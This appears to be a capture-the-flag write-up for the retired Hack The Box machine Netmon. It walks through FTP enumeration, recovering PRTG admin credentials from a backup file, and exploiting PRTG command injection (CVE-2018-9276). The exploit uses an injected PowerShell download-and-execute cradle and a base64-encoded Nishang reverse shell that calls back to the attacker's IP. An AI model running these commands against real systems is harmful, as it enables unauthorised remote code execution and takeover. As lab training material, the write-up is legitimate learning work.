# Netmon

This is the write-up for the box Netmon that got retired at the 29th June 2019. 
My IP address was 10.10.13.112 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.152    netmon.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/netmon.nmap 10.10.10.152
```

```markdown
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_07-02-19  12:39PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## Checking FTP (Port 21)

The Nmap scan shows us that we have access to the C: drives root folders on the box with anonymous login on FTP. 
If we check the internet for **Windows LFI files** we get a list of important files that we can analyze in the Windows folder.

Some important files would be:
- C:\Windows\php.ini
- C:\Windows\repair\*
- C:\Windows\System32\drivers\etc\hosts
- C:\Windows\Panther\unattended.xml
- C:\Windows\System32\config\*

These are some files you would use to get more information but on this box but in our case they don't help much.
We can download **C:\Users\Public\Desktop\user.txt** to get the first flag.

As the Nmap script told us the service on HTTP is PRTG Network Monitor, we can look for configuration files for that. These files are in the  directory_ProgramData\Paessler\PRTG Network Monitor_.
If we check the files there we see there are the files **PRTG Configuration.dat** and **PRTG Configuration.old.bak**.
The first one is a default configuration file but the .old.bak is different. 

It contains a username and a password:
> prtgadmin:PrTg@dmin2018


## Checking HTTP (Port 80)

The webpage is the monitoring system **PRTG Network Monitor** in the version 18.1.37 and logging in with default credentials and the gathered credentials does not work.

As the file is from 2019 lets increment the year by one so the password looks like this:
> PrTg@dmin2019

And we are logged in as the user prtgadmin.

### Exploiting PRTG

After searching for exploits we find **CVE-2018-9276** that exploits and OS command injection vulnerability by sending malformed parameters in sensor or notification management scenarios.

We can setup notifications on _Setup_ --> _Notifications_. Clicking on one the notifications and then _Settings_ there is an option to **Execute Program**.

```markdown
Demo exe notification - outfile.ps1

Parameter:
test | ping -n 1 10.10.13.112
```

Listening on ICMP packets with tcpdump and then sending the test notification, we will get a ping response. This validates that we have command execution and the next step is a reverse shell.

We will use the reverse shell the from Nishang _Invoke-PowerShellTcp.ps1_ that I upload on a webserver as _shell.ps1_.

Start webserver and listen on port 80:
```markdown
python -m SimpleHTTPServer
nc -lvnp 80
```

On PRTG we want to execute this command to download the file and execute it:
```markdown
test | IEX(New-Object Net.WebClient).downloadString("http://10.10.13.112:8000/shell.ps1")
```

Unfortunaly this does not give us a shell. So we will eliminate bad characters by Base64 encoding the shell:
```markdown
cat shell.ps1 | iconv -t UTF-16LE | base64 -w0
```

Copy the long Base64 string and input it into the parameter and send the notification again:
```markdown
test | powershell -enc [base64 shell.ps1]
```

This time we get a reverse shell as _NT Authority\SySTEM_ and can read root.txt!
